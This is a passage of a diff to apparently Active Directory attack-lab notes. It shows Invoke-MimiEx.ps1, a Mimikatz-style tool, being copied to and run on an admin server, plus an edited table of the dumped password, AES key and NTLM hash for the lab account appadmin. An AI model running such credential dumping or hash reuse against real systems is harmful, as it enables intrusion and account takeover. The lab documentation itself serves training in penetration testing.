@@ -296,13 +296,15 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 ```powershell
 .\Invoke-MimiEx.ps1
 ```
+`appadmin`
 
-appadmin
 | Type        | Hash                                                             |
 | ----------- | ---------------------------------------------------------------- |
-| Password    | \*ThisisBlasphemyThisisMadness!!                                 |
-| aes256_hmac | 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 |
+| Password    | \*ActuallyTheWebServer1                                 |
+| aes256_hmac | 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb |
 | rc4_hmac_nt | b38ff50264b74508085d82c69794a4d8                                 |
+
+``
 
 | Type        | Hash                                                             |
 | ----------- | ---------------------------------------------------------------- |
